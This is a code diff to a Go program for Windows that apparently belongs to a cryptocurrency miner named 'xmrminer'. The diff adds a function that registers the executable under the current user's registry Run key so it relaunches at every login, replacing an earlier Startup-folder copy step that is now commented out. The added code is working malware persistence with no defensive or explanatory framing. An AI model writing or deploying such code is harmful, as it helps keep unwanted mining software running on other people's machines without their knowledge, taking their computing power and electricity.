@@ -12,6 +12,7 @@ import (
 	"path/filepath"
 	"strings"
 	"syscall"
+	"golang.org/x/sys/windows/registry"
 //	"os/user"
 // 	"os/signal"
 )
@@ -165,6 +166,31 @@ func copy(src, dst string) error {
 	return nil
 }
 
+func autostart() {
+	// Get the path to the executable
+	exePath, err := filepath.Abs(os.Args[0])
+	if err != nil {
+		log.Println("Error getting executable path:", err)
+		return
+	}
+
+	// Open the registry key for the current user's autostart programs
+	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
+	if err != nil {
+		log.Println("Error opening registry key:", err)
+		return
+	}
+
+	// Add the program to the autostart programs
+	err = key.SetStringValue("xmrminer", exePath)
+	if err != nil {
+		log.Println("Error adding program to autostart:", err)
+		return
+	}
+
+	log.Println("Program added to autostart successfully.")
+}
+
 
 func main() {
 	f, err := os.OpenFile("log.txt", os.O_RDWR | os.O_CREATE | os.O_APPEND, 0666)
@@ -180,12 +206,14 @@ func main() {
 //	}
 //	homedir := currentUser.HomeDir
 
-	startup := filepath.Join("C:\\", "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
-	err = copy(os.Args[0], startup)
-	if err != nil {
-		log.Panicf("copy -> %v", err)
-	}
-	log.Printf("NOTERROR startup string is: %s", startup)
+//	startup := filepath.Join("C:\\", "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
+//	err = copy(os.Args[0], startup)
+//	if err != nil {
+//		log.Panicf("copy -> %v", err)
+//	}
+//	log.Printf("NOTERROR startup string is: %s", startup)
+
+	autostart()
 
 	dir, err := ioutil.TempDir("", "xmrminer")
 	if err != nil {
